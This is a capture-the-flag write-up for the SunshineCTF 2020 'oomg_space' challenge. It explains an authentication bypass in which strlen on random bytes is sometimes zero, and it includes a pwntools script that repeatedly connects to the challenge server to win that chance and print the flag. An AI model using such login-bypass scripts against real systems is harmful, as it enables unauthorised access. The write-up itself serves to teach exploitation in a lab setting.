# oomg_space [350]

The Sunshine Space Center has posted a bug bounty program! Anyone who can bypass the login screen will be rewarded with an all-expenses-paid one-way trip to Mars!

`nc chal.2020.sunshinectf.org 20001`

**Files**: `oomg_space`

In this writeup, I'll be using the unintended solution (that the challenge authors later patched with a new challenge).

## Solution

This is the part of the code you need to care about:

```c
char random_49_bytes[50];
bool compare_password(char *rand, char *pass, size_t len) {
    /* code to compare the first `len` bytes of `rand` with `pass` */
}
void puts_no_newline(char *s) { /* code to print a string without adding a newline */ }
void show_flag() { /* code to print the flag */ }

char *init_random_bytes() {
  unsigned int urand = open("/dev/urandom", 0);
  read(urand, random_49_bytes, 49);
  close(urand);
  random_49_bytes[49] = 0;
  return random_49_bytes;
}

bool login() {
  char username[16]; // [rsp-28h] [rbp-28h]
  puts_no_newline("USER\n");
  memset(username, 0, 16); // internally this is just MOVs
  read(0, username, 16);
  if (strcmp(username, "admin")) {
    puts_no_newline("BAD USER ");
    puts_no_newline(username);     // Note that this allows us to leak the location of random_49_bytes
    puts_no_newline("\n");
    return 0;
  }
  puts_no_newline("PASSWORD\n");
  long long passwd_len = 0;
  read(0, &passwd_len, 8);
  passwd_len = byteswapped(passwd_len);
  char *passwd = (char *)malloc_(passwd_len + 1LL); //note that 0xffffffffffffffff+1 == 0
  read(0, passwd, passwd_len);
  passwd[passwd_len] = 0;
  if (compare_passwd(random_49_bytes, passwd, strlen(random_49_bytes))) {
    puts_no_newline("LOGIN FAIL\n");
    exit(1);
  }
  puts_no_newline("LOGIN SUCCESS\n");
  return 1;
}

int main() {
  init_random_bytes();
  puts_no_newline("HELLO\n");
  puts_no_newline("SERVER sunshine.space.center.local\n");
  int password_tries_remaining = 3;
  while (password_tries_remaining-- > 0) {
    if (login()) {
      show_flag();
      usleep(100000);
      return 0;
    }
    puts_no_newline("AGAIN\n");
  }
  puts_no_newline("LOCKOUT\n");
}
```
The goal is to pass the password check in `login()` in order to get the flag printed. This is done by a one-shot string comparsion between a user-inputted password against 49 bytes of output from /dev/urandom.

`strlen()` is used to get the length of `random_49_bytes`. If `strlen(random_49_bytes)` happens to be 0, the check with `compare_passwd` will be immediately bypassed. Since `/dev/urandom` can provide null bytes (with a 1/256 probability), we'll just dig at the server until we're lucky enough to land in that situation.

```python
from pwn import *
context.binary = 'oomg_space'
for i in range(1000): #Because there is a 1/256 chance that /urandom gives a 0 first byte, this can work
    p = remote('chal.2020.sunshinectf.org', 20001)
    p.sendafter('USER\n', 'admin')
    p.sendafter('PASSWORD\n', pack((1<<64)-1))  # Just use any number that won't crash.
    print(p.recvall())
```
```sh
$ python3.8 oomg_space.py > a.log
$ grep sun{ a.log
b'LOGIN SUCCESS\nFLAG sun{g0tt4_ch3ck_th053_r37urn_c0d35}\n'
```

It's that simple.